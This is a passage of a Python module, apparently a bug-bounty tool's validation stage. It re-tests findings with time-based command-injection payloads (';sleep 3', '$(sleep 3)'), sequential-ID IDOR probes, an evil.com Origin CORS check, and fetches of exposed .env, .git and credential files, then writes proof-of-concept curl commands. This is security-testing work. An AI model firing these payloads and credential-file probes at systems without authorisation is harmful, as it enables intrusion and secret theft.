                            "severity_assessment": "LOW — open redirect confirmed",
                        }
    except Exception:
        pass

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "No redirect to external domain detected"}


async def _validate_rce(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate RCE — use time-based detection only (no destructive payloads)."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No param for RCE test"}

    payloads = [
        (";sleep 3", 3),
        ("|sleep 3", 3),
        ("$(sleep 3)", 3),
        ("`sleep 3`", 3),
    ]

    try:
        async with aiohttp.ClientSession() as session:
            base_start = time.monotonic()
            async with session.get(
                endpoint, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
            ) as resp:
                await resp.text()
            baseline = time.monotonic() - base_start

            for payload_str, delay in payloads:
                test_url = _replace_param(endpoint, param, payload_str)
                req_start = time.monotonic()
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False,
                    timeout=aiohttp.ClientTimeout(total=delay + 10),
                ) as resp:
                    await resp.text()
                elapsed = time.monotonic() - req_start

                if elapsed >= baseline + delay - 0.5:
                    return {
                        "status": CONFIRMED,
                        "evidence": f"RCE (time-based): baseline={baseline:.1f}s, payload={elapsed:.1f}s",
                        "poc_request": f"GET {test_url}",
                        "poc_response": f"Response delayed by ~{delay}s confirming command execution",
                        "reproduction_steps": [
                            f"1. Send request with param '{param}' = {payload_str}",
                            f"2. Response delayed by {delay}s (baseline: {baseline:.1f}s)",
                            "3. Command injection confirmed via time-based detection",
                        ],
                        "curl_command": f"curl -sk -o /dev/null -w '%{{time_total}}' '{test_url}'",
                        "impact": "Remote code execution — full server compromise",
                        "severity_assessment": "CRITICAL — RCE confirmed via time-based detection",
                    }
    except Exception:
        pass

    return {"status": NEEDS_MANUAL_REVIEW, "reason": "RCE needs manual verification (time-based inconclusive)"}


async def _validate_idor(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate IDOR by checking if sequential IDs return different data."""
    endpoint = finding.get("endpoint", "")
    param = _extract_param_name(finding)
    if not param:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No param for IDOR test"}

    try:
        async with aiohttp.ClientSession() as session:
            responses: list[tuple[str, int, str]] = []
            for test_id in ["1", "2", "3", "0", "999"]:
                test_url = _replace_param(endpoint, param, test_id)
                async with session.get(
                    test_url, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
                ) as resp:
                    body = await resp.text(errors="replace")
                    responses.append((test_id, resp.status, body[:500]))

            ok_responses = [(tid, body) for tid, status, body in responses if status == 200]
            if len(ok_responses) >= 2:
                bodies = [body for _, body in ok_responses]
                if len(set(bodies)) > 1:
                    return {
                        "status": CONFIRMED,
                        "evidence": (
                            f"IDOR: {len(ok_responses)} different IDs return "
                            "different data without auth check"
                        ),
                        "poc_request": f"GET {_replace_param(endpoint, param, '1')}",
                        "poc_response": ok_responses[0][1][:500],
                        "reproduction_steps": [
                            f"1. Request {endpoint} with '{param}' = 1",
                            f"2. Request same endpoint with '{param}' = 2",
                            "3. Both return 200 with different data — no authorization check",
                        ],
                        "curl_command": f"curl -sk '{_replace_param(endpoint, param, '1')}'",
                        "impact": "IDOR allows accessing other users' data by changing the ID",
                        "severity_assessment": "MEDIUM — IDOR confirmed, authorization bypass",
                    }
    except Exception:
        pass

    return {"status": NEEDS_MANUAL_REVIEW, "reason": "IDOR needs authenticated context for verification"}


async def _validate_header_injection(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate header injection."""
    return {
        "status": NEEDS_MANUAL_REVIEW,
        "reason": "Header injection requires manual verification with browser dev tools",
    }


async def _validate_jwt(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate JWT weakness — check if none alg or weak secret was found."""
    description = finding.get("description", "").lower()
    evidence = finding.get("evidence", "")

    if "none" in description and "algorithm" in description:
        return {
            "status": CONFIRMED,
            "evidence": "JWT accepts 'none' algorithm — authentication bypass",
            "poc_request": finding.get("curl_command", ""),
            "poc_response": evidence[:1000],
            "reproduction_steps": [
                "1. Decode the JWT token",
                "2. Change algorithm to 'none' in header",
                "3. Remove signature",
                "4. Server accepts the modified token",
            ],
            "curl_command": finding.get("curl_command", ""),
            "impact": "Complete authentication bypass — forge any user token",
            "severity_assessment": "CRITICAL — JWT none algorithm accepted",
        }

    if "secret" in description and ("cracked" in description or "brute" in description):
        return {
            "status": CONFIRMED,
            "evidence": f"JWT weak secret found: {evidence[:200]}",
            "poc_request": finding.get("curl_command", ""),
            "poc_response": evidence[:1000],
            "reproduction_steps": [
                "1. JWT signing secret was brute-forced",
                "2. Forge tokens with the discovered secret",
                "3. Full authentication bypass possible",
            ],
            "curl_command": finding.get("curl_command", ""),
            "impact": "JWT secret compromised — forge arbitrary tokens",
            "severity_assessment": "CRITICAL — JWT signing secret cracked",
        }

    return {"status": NEEDS_MANUAL_REVIEW, "reason": "JWT finding needs manual verification"}


async def _validate_bac(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate broken access control."""
    evidence = finding.get("evidence", "")
    if "bypass" in evidence.lower() or "status 200" in evidence.lower() or "returned 200" in evidence.lower():
        return {
            "status": CONFIRMED,
            "evidence": f"BAC confirmed: {evidence[:500]}",
            "poc_request": finding.get("curl_command", f"GET {finding.get('endpoint', '')}"),
            "poc_response": evidence[:1000],
            "reproduction_steps": [
                f"1. Access {finding.get('endpoint', '')} without proper authorization",
                "2. Server returns 200 OK with protected content",
            ],
            "curl_command": finding.get("curl_command", ""),
            "impact": "Broken access control allows unauthorized access to protected resources",
            "severity_assessment": "HIGH — access control bypass confirmed",
        }
    return {"status": NEEDS_MANUAL_REVIEW, "reason": "BAC needs authenticated session for verification"}


async def _validate_mass_assignment(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate mass assignment."""
    return {
        "status": NEEDS_MANUAL_REVIEW,
        "reason": "Mass assignment needs manual verification with authenticated session",
    }


async def _validate_cors(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate CORS misconfiguration."""
    endpoint = finding.get("endpoint", finding.get("url", ""))
    if not endpoint:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No endpoint for CORS test"}

    try:
        async with aiohttp.ClientSession() as session:
            hdrs = {**_HEADERS, "Origin": "https://evil.com"}
            async with session.get(
                endpoint, headers=hdrs, ssl=False, timeout=_TIMEOUT,
            ) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                if acao == "https://evil.com":
                    severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                    return {
                        "status": CONFIRMED,
                        "evidence": f"CORS: Origin reflected ({acao}), credentials={acac}",
                        "poc_request": f"GET {endpoint} with Origin: https://evil.com",
                        "poc_response": f"ACAO: {acao}, ACAC: {acac}",
                        "reproduction_steps": [
                            f"1. Send request to {endpoint} with Origin: https://evil.com",
                            f"2. Response includes Access-Control-Allow-Origin: {acao}",
                            f"3. Allow-Credentials: {acac}",
                        ],
                        "curl_command": f"curl -sk -H 'Origin: https://evil.com' '{endpoint}' -D -",
                        "impact": "CORS misconfiguration allows cross-origin data theft",
                        "severity_assessment": f"{severity} — CORS origin reflection confirmed",
                    }
                if acao == "*":
                    return {
                        "status": CONFIRMED,
                        "evidence": "CORS: wildcard (*) Access-Control-Allow-Origin",
                        "poc_request": f"GET {endpoint}",
                        "poc_response": f"ACAO: {acao}",
                        "reproduction_steps": [
                            f"1. Send request to {endpoint}",
                            "2. Response includes Access-Control-Allow-Origin: *",
                        ],
                        "curl_command": f"curl -sk '{endpoint}' -D -",
                        "impact": "CORS wildcard allows any origin to read responses",
                        "severity_assessment": "MEDIUM — CORS wildcard",
                    }
    except Exception:
        pass

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "CORS headers not reflecting arbitrary origin"}


async def _validate_file_exposure(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate file/path exposure by re-requesting the URL."""
    endpoint = finding.get("endpoint", finding.get("url", ""))
    if not endpoint:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No URL"}

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                endpoint, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
            ) as resp:
                body = await resp.text(errors="replace")
                if resp.status == 200 and len(body) > 50:
                    return {
                        "status": CONFIRMED,
                        "evidence": f"File accessible: {resp.status} ({len(body)} bytes)",
                        "poc_request": f"GET {endpoint}",
                        "poc_response": body[:1000],
                        "reproduction_steps": [
                            f"1. Access {endpoint}",
                            f"2. Server returns {resp.status} with {len(body)} bytes",
                        ],
                        "curl_command": f"curl -sk '{endpoint}'",
                        "impact": "Sensitive file exposed publicly",
                        "severity_assessment": "MEDIUM — sensitive file confirmed accessible",
                    }
    except Exception:
        pass

    return {"status": LIKELY_FALSE_POSITIVE, "reason": "File not accessible (404 or empty)"}


async def _validate_default_creds(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate default credentials — mark for manual review (no auto-auth)."""
    return {
        "status": NEEDS_MANUAL_REVIEW,
        "reason": "Default credential testing requires manual verification to avoid lockout",
        "evidence": finding.get("evidence", ""),
    }


async def _validate_cookie_injection(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate cookie injection finding."""
    evidence = finding.get("evidence", "")
    if evidence and ("set-cookie" in evidence.lower() or "reflected" in evidence.lower()):
        return {
            "status": CONFIRMED,
            "evidence": f"Cookie injection confirmed: {evidence[:500]}",
            "poc_request": finding.get("curl_command", ""),
            "poc_response": evidence[:1000],
            "reproduction_steps": [
                "1. Inject payload into cookie parameter",
                "2. Server reflects/stores the injected value",
            ],
            "curl_command": finding.get("curl_command", ""),
            "impact": "Cookie injection may lead to session fixation or XSS",
            "severity_assessment": "MEDIUM — cookie injection confirmed",
        }
    return {"status": NEEDS_MANUAL_REVIEW, "reason": "Cookie injection needs browser verification"}


async def _validate_deserialization(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate deserialization — too dangerous to auto-verify."""
    return {
        "status": NEEDS_MANUAL_REVIEW,
        "reason": "Deserialization exploitation is destructive — manual verification required",
        "evidence": finding.get("evidence", ""),
    }


async def _validate_rate_limiting(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate rate limiting absence."""
    return {
        "status": NEEDS_MANUAL_REVIEW,
        "reason": "Rate limiting verification needs controlled testing environment",
        "evidence": finding.get("evidence", ""),
    }


async def _validate_generic(finding: dict[str, Any]) -> dict[str, Any]:
    """Generic validation for unknown vuln classes."""
    endpoint = finding.get("endpoint", "")
    if not endpoint:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No endpoint for generic verification"}

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                endpoint, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
            ) as resp:
                if resp.status == 200:
                    return {
                        "status": NEEDS_MANUAL_REVIEW,
                        "reason": (
                            f"Endpoint responds (HTTP {resp.status}) but "
                            f"'{finding.get('vulnerability_class')}' needs manual verification"
                        ),
                    }
                else:
                    return {
                        "status": LIKELY_FALSE_POSITIVE,
                        "reason": f"Endpoint returned HTTP {resp.status}",
                    }
    except Exception as exc:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": f"Connection error: {exc}"}


# ---------------------------------------------------------------------------
# Immediate win verification
# ---------------------------------------------------------------------------


async def _verify_immediate_win(
    win_type: str,
    url: str,
    host: str,
) -> dict[str, Any]:
    """Verify a single immediate win finding."""
    # Normalize type from analyze.py format (EXPOSED_ENV_FILE -> exposed_env_file)
    wt = win_type.lower()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url, headers=_HEADERS, ssl=False, timeout=_TIMEOUT,
            ) as resp:
                body = await resp.text(errors="replace")
                status = resp.status

                if status != 200:
                    return {
                        "type": win_type, "host": host, "url": url,
                        "status": LIKELY_FALSE_POSITIVE,
                        "reason": f"HTTP {status} — not accessible",
                    }

                # Type-specific content validation
                # wt is lowercased; analyze.py uses EXPOSED_GIT_REPO, EXPOSED_ENV_FILE, etc.
                if "git" in wt:
                    if "[core]" in body or "[remote" in body or "repositoryformatversion" in body:
                        return _confirmed_win(
                            win_type, url, host, body,
                            "Git config exposed — repository metadata leak",
                        )

                elif "env" in wt:
                    if "=" in body and any(
                        k in body.upper() for k in ["DB_", "API_KEY", "SECRET", "PASSWORD", "TOKEN"]
                    ):
                        return _confirmed_win(
                            win_type, url, host, body,
                            ".env file exposed — credentials leak",
                        )
                    # If .env returns HTML or non-env content, it's a false positive
                    if body.strip().startswith(("<!doctype", "<html", "<!DOCTYPE")):
                        return {
                            "type": win_type, "host": host, "url": url,
                            "status": LIKELY_FALSE_POSITIVE,
                            "reason": "URL returns HTML, not an .env file",
                        }

                elif "credential" in wt or "leaked" in wt:
                    # Check for actual credential-like content
                    if any(k in body.upper() for k in ["KEY", "SECRET", "PASSWORD", "TOKEN", "AKIA"]):
                        return _confirmed_win(win_type, url, host, body, "Credentials file exposed")

                elif "cors" in wt:
                    hdrs = {**_HEADERS, "Origin": "https://evil.com"}
                    async with session.get(
                        url, headers=hdrs, ssl=False, timeout=_TIMEOUT,
                    ) as cors_resp:
                        acao = cors_resp.headers.get("Access-Control-Allow-Origin", "")
                        if "evil.com" in acao or acao == "*":
                            return _confirmed_win(
                                win_type, url, host,
                                f"ACAO: {acao}", "CORS allows arbitrary origin",
                            )

                elif "takeover" in wt:
                    return {
                        "type": win_type, "host": host, "url": url,
                        "status": NEEDS_MANUAL_REVIEW,
                        "reason": "Subdomain takeover needs DNS verification and claim attempt",
                    }

                elif "actuator" in wt:
                    if any(k in body for k in ["beans", "env", "health", "mappings", "configprops"]):
                        return _confirmed_win(
                            win_type, url, host, body,
                            "Spring Boot Actuator exposed — info leak",
                        )

                elif "phpinfo" in wt:
                    if "PHP Version" in body or "phpinfo()" in body:
                        return _confirmed_win(
                            win_type, url, host, body,
                            "phpinfo() exposed — server information leak",
                        )

                elif "backup" in wt:
                    # Backup files shouldn't be HTML pages
                    if len(body) > 100 and not body.strip().startswith(("<!doctype", "<html", "<!DOCTYPE")):
                        return _confirmed_win(
                            win_type, url, host, body, "Backup file accessible",
                        )

                elif "swagger" in wt or "api_doc" in wt:
                    if any(k in body for k in ['"paths"', '"openapi"', '"swagger"', "Swagger UI"]):
                        return _confirmed_win(
                            win_type, url, host, body,
                            "API documentation exposed — full endpoint disclosure",
                        )

                elif "config" in wt and "env" not in wt:
                    if body.strip().startswith(("{", "[", "<?")) or "=" in body:
                        if not body.strip().startswith(("<!doctype", "<html", "<!DOCTYPE")):
                            return _confirmed_win(
                                win_type, url, host, body,
                                "Configuration file exposed — potential credential leak",
                            )

                elif "admin" in wt:
                    # Admin panel: confirmed if page loads (200) with form or admin content
                    if any(k in body.lower() for k in ["login", "password", "admin", "dashboard"]):
                        return _confirmed_win(
                            win_type, url, host, body,
                            "Admin panel accessible — potential brute-force target",
                        )

                elif "graphql" in wt:
                    if any(k in body for k in ['"__schema"', '"data"', "GraphQL", "graphiql"]):
                        return _confirmed_win(
                            win_type, url, host, body,
                            "GraphQL endpoint exposed — schema introspection possible",
                        )

                elif "svn" in wt:
                    if any(k in body for k in ["dir", "svn", "entries", "wc.db"]):
                        return _confirmed_win(
                            win_type, url, host, body,
                            "SVN metadata exposed — source code recovery possible",
                        )

                elif "debug" in wt:
                    if any(k in body.lower() for k in [
                        "stack trace", "debug", "traceback", "exception",
                        "django debug", "rails", "environment", "phpinfo",
                    ]):
                        return _confirmed_win(
                            win_type, url, host, body,
                            "Debug endpoint exposed — information disclosure",
                        )

                # Generic: file exists and has meaningful content (not just an HTML error page)
                if len(body) > 50 and not body.strip().startswith(("<!doctype", "<html", "<!DOCTYPE")):
                    return {
                        "type": win_type, "host": host, "url": url,
                        "status": CONFIRMED,
                        "evidence": f"Accessible: {len(body)} bytes",
                        "curl_command": f"curl -sk '{url}'",
                    }
                elif len(body) > 50:
                    return {
                        "type": win_type, "host": host, "url": url,
                        "status": LIKELY_FALSE_POSITIVE,
                        "reason": f"URL returns HTML page ({len(body)} bytes), not expected file content",
                    }

    except Exception as exc:
        return {
            "type": win_type, "host": host, "url": url,
            "status": NEEDS_MANUAL_REVIEW,
            "reason": f"Verification error: {exc}",
        }

    return {
        "type": win_type, "host": host, "url": url,
        "status": LIKELY_FALSE_POSITIVE,
        "reason": "Content check failed",
    }


def _confirmed_win(
    win_type: str, url: str, host: str, body: str, impact: str,
) -> dict[str, Any]:
    """Build a confirmed immediate win result."""
    # Normalize type for CVSS lookup (EXPOSED_ENV_FILE -> exposed_env_file -> exposed_env)
    cvss_key = _normalize_win_type(win_type)
    return {
        "type": win_type,
        "host": host,
        "url": url,
        "status": CONFIRMED,
        "evidence": body[:500],
        "curl_command": f"curl -sk '{url}'",
        "impact": impact,
        "cvss_score": CVSS_SCORES.get(cvss_key, CVSS_SCORES.get(win_type, 5.0)),
    }


def _normalize_win_type(win_type: str) -> str:
    """Normalize analyze.py win types to CVSS_SCORES keys.

    EXPOSED_ENV_FILE -> exposed_env
    EXPOSED_GIT_REPO -> exposed_git
    CRITICAL_CORS -> cors_misconfiguration
    LEAKED_CLOUD_CREDENTIAL -> exposed_credentials
    SUBDOMAIN_TAKEOVER -> subdomain_takeover
    """
    wt = win_type.lower()
    if "env" in wt:
        return "exposed_env"
    if "git" in wt:
        return "exposed_git"
    if "cors" in wt:
        return "cors_misconfiguration"
    if "credential" in wt or "leaked" in wt:
        return "exposed_credentials"
    if "takeover" in wt:
        return "subdomain_takeover"
    if "actuator" in wt:
        return "exposed_actuator"
    if "phpinfo" in wt:
        return "exposed_phpinfo"
    if "backup" in wt:
        return "exposed_backup"
    if "swagger" in wt or "api_doc" in wt:
        return "exposed_swagger"
    if "config" in wt:
        return "exposed_config"
    if "admin" in wt:
        return "exposed_admin"
    if "graphql" in wt:
        return "exposed_graphql"
    if "svn" in wt:
        return "exposed_svn"
    if "debug" in wt:
        return "exposed_debug"
    return wt


# ---------------------------------------------------------------------------
# DNS-based validation (subdomain takeover)
# ---------------------------------------------------------------------------


async def _validate_dns(finding: dict[str, Any]) -> dict[str, Any]:
    """Validate subdomain takeover via DNS checks."""
    host = finding.get("host", "")
    if not host:
        return {"status": NEEDS_MANUAL_REVIEW, "reason": "No host for DNS check"}

    if tool_runner.is_available("dig"):
        result = await tool_runner.run("dig", ["+short", "CNAME", host], target=host, timeout=10)
        if result.success and result.results:
            cname = result.results[0].strip().rstrip(".")
            nxdomain = await tool_runner.run(
                "dig", ["+short", cname], target=cname, timeout=10,
            )
            if nxdomain.success and not nxdomain.results:
                return {
                    "status": CONFIRMED,
                    "evidence": f"Dangling CNAME: {host} -> {cname} (NXDOMAIN)",
                    "poc_request": f"dig CNAME {host}",
                    "poc_response": f"CNAME: {cname} (target does not resolve)",
                    "reproduction_steps": [
                        f"1. {host} has CNAME pointing to {cname}",
                        f"2. {cname} does not resolve (NXDOMAIN)",
                        "3. Register/claim the CNAME target to take over the subdomain",
                    ],
                    "curl_command": f"dig +short CNAME {host}",
                    "impact": "Subdomain takeover — attacker can serve content on this subdomain",
                    "severity_assessment": "HIGH — dangling CNAME confirmed",
                }

    return {"status": NEEDS_MANUAL_REVIEW, "reason": "DNS takeover needs manual CNAME verification"}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _replace_param(url: str, param: str, new_value: str) -> str:
    """Replace a query parameter value in a URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if param not in qs:
        sep = "&" if parsed.query else ""
        new_query = f"{parsed.query}{sep}{param}={new_value}"
    else:
        qs[param] = [new_value]
        new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _extract_param_name(finding: dict[str, Any]) -> str | None:
    """Extract the vulnerable parameter name from a finding."""
    param = finding.get("param", finding.get("parameter", ""))
    if param:
        return param

    endpoint = finding.get("endpoint", "")
    if "?" in endpoint:
        parsed = urlparse(endpoint)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if qs:
            return list(qs.keys())[0]

    payload = finding.get("payload_used", "")
    if "=" in payload and not payload.startswith("'"):
        return payload.split("=")[0]

    desc = finding.get("description", "")
    if "parameter" in desc.lower():
        m = re.search(r"parameter\s+['\"]?(\w+)['\"]?", desc, re.IGNORECASE)
        if m:
            return m.group(1)

    return None


def _cvss_key(vuln_class: str, finding: dict[str, Any]) -> str:
    """Determine the specific CVSS key for a finding."""
    desc = finding.get("description", "").lower()

    if vuln_class == "sqli":
        if "blind" in desc or "time" in desc:
            return "sqli_blind"
        if "error" in desc:
            return "sqli_error_based"
        return "sqli"
    elif vuln_class == "xss":
        if "stored" in desc:
            return "xss_stored"
        if "dom" in desc:
            return "xss_dom"
        return "xss_reflected"
    elif vuln_class == "ssrf":
        if "blind" in desc or "oob" in desc:
            return "ssrf_blind"
        return "ssrf"
    elif vuln_class == "lfi":
        if "rce" in desc or "command" in desc:
            return "lfi_rce"
        return "lfi"
    elif vuln_class == "idor":
        if "data" in desc or "leak" in desc:
            return "idor_data_leak"
        return "idor"
    elif vuln_class == "jwt":
        if "none" in desc:
            return "jwt_none_alg"
        return "jwt_weak_secret"

    return vuln_class


def _sqlmap_confirms(output: str) -> bool:
    """Check if sqlmap output confirms injection."""
    output_lower = output.lower()
    indicators = [
        "is vulnerable",
        "injectable",
        "sqlmap identified the following injection point",
    ]
    return any(ind in output_lower for ind in indicators)


def _extract_sqlmap_evidence(output: str) -> str:
    """Extract key evidence from sqlmap output."""
    lines = output.split("\n")
    evidence_lines = []
    for line in lines:
        lower = line.lower()
        if any(kw in lower for kw in [
            "is vulnerable", "injectable", "type:", "title:", "payload:",
            "back-end dbms", "parameter:", "sqlmap identified",
        ]):
            evidence_lines.append(line.strip())
    return "\n".join(evidence_lines[:15]) if evidence_lines else output[:500]


def _extract_db_type(output: str) -> str:
    """Extract database type from sqlmap output."""
    for line in output.split("\n"):
        if "back-end dbms" in line.lower():
            return line.split(":")[-1].strip() if ":" in line else line.strip()
    if "mysql" in output.lower():
        return "MySQL"
    if "postgresql" in output.lower():
        return "PostgreSQL"
    if "sqlite" in output.lower():
        return "SQLite"
    if "microsoft" in output.lower():
        return "MSSQL"
    return "Unknown"


def _build_curl_from_finding(finding: dict[str, Any]) -> str:
    """Build a curl command from a finding."""
    endpoint = finding.get("endpoint", "")
    payload = finding.get("payload_used", "")
    if payload:
        return f"curl -sk '{endpoint}' --data '{payload}'"
    return f"curl -sk '{endpoint}'"


def _next_step_advice(status: str, vuln_class: str) -> str:
    """Generate next step advice based on validation result."""
    if status == CONFIRMED:
        return "Finding confirmed. Ready for report. Use bughound_generate_report."
    elif status == LIKELY_FALSE_POSITIVE:
        return "Likely false positive. Consider removing from report."
    else:
        return f"Needs manual review. Test {vuln_class} manually with browser/Burp Suite."


def _classify_sensitive_path(sp: dict[str, Any]) -> str:
    """Classify a sensitive path finding into an immediate win type."""
    path = sp.get("path", "").lower()
    if ".git" in path:
        return "exposed_git"
    if ".env" in path:
        return "exposed_env"
    if "actuator" in path:
        return "exposed_actuator"
    if "phpinfo" in path:
        return "exposed_phpinfo"
    if any(ext in path for ext in [".bak", ".old", ".backup", ".sql", ".dump"]):
        return "exposed_backup"
    return "file_exposure"


def _win_to_finding(
    win: dict[str, Any],
    verification: dict[str, Any],
) -> dict[str, Any]:
    """Convert an immediate win + verification into a finding dict."""
    win_type = win.get("type", "unknown")
    # Resolve URL from url/endpoint/path+host
    win_url = win.get("url", win.get("endpoint", ""))
    if not win_url and win.get("host") and win.get("path"):
        path = win["path"]
        win_url = path if path.startswith("http") else f"https://{win['host']}{path}"
    win_url = win_url or verification.get("url", "")
    return {
        "finding_id": f"finding_immediate_{hashlib.sha256(win_url.encode()).hexdigest()[:8]}",
        "host": win.get("host", ""),
        "endpoint": win_url,
        "vulnerability_class": win_type,
        "severity": "high" if "credential" in win_type.lower() or "env" in win_type.lower() else "medium",
        "tool": "validator",
        "technique_id": "immediate_win_verification",
        "description": win.get("description", win.get("evidence", "")),
        "evidence": verification.get("evidence", ""),
        "curl_command": verification.get("curl_command", ""),
        "confidence": "high",
        "needs_validation": False,
        "validated": True,
        "validation_status": CONFIRMED,
        "validation_tool": "curl",
        "cvss_score": CVSS_SCORES.get(_normalize_win_type(win_type), CVSS_SCORES.get(win_type, 5.0)),
        "impact": verification.get("impact", win.get("impact", "")),
        "poc_request": f"GET {win_url}",
        "poc_response": verification.get("evidence", "")[:1000],
        "reproduction_steps": [f"1. Access {win.get('url', '')}"],
    }


# ---------------------------------------------------------------------------
# Workspace I/O
# ---------------------------------------------------------------------------


async def _load_findings(workspace_id: str) -> list[dict[str, Any]]:
    """Load findings from scan_results.json."""
    data = await workspace.read_data(workspace_id, "vulnerabilities/scan_results.json")
    if isinstance(data, dict) and "data" in data:
        return data["data"]
    if isinstance(data, list):
        return data
    return []


async def _save_findings(workspace_id: str, findings: list[dict[str, Any]]) -> None:
    """Save updated findings back to scan_results.json."""
    await workspace.write_data(
        workspace_id, "vulnerabilities/scan_results.json", findings,
        generated_by="stage5_validator", target="multiple",
    )


async def _write_confirmed_finding(
    workspace_id: str,
    finding: dict[str, Any],
) -> None:
    """Write a confirmed finding to vulnerabilities/confirmed/{finding_id}.json."""
    finding_id = finding.get("finding_id", "unknown")
    await workspace.write_data(
        workspace_id, f"vulnerabilities/confirmed/{finding_id}.json", [finding],
        generated_by="stage5_validator", target=finding.get("host", ""),
    )


async def _update_validation_tracking(
    workspace_id: str,
    findings: list[dict[str, Any]],
) -> None:
    """Update validated.json, false_positives.json, manual_review.json."""
    validated = [f for f in findings if f.get("validated")]
    confirmed = [f for f in validated if f.get("validation_status") == CONFIRMED]
    false_pos = [f for f in validated if f.get("validation_status") == LIKELY_FALSE_POSITIVE]
    manual = [f for f in validated if f.get("validation_status") == NEEDS_MANUAL_REVIEW]

    await workspace.write_data(
        workspace_id, "vulnerabilities/validated.json", validated,
        generated_by="stage5_validator", target="multiple",
    )
    if false_pos:
        await workspace.write_data(
            workspace_id, "vulnerabilities/false_positives.json", false_pos,
            generated_by="stage5_validator", target="multiple",
        )
    if manual:
        await workspace.write_data(
            workspace_id, "vulnerabilities/manual_review.json", manual,
            generated_by="stage5_validator", target="multiple",
        )

    await workspace.update_stats(
        workspace_id,
        findings_confirmed=len(confirmed),
    )


def _error(error_type: str, message: str) -> dict[str, Any]:
    return {"status": "error", "error_type": error_type, "message": message}
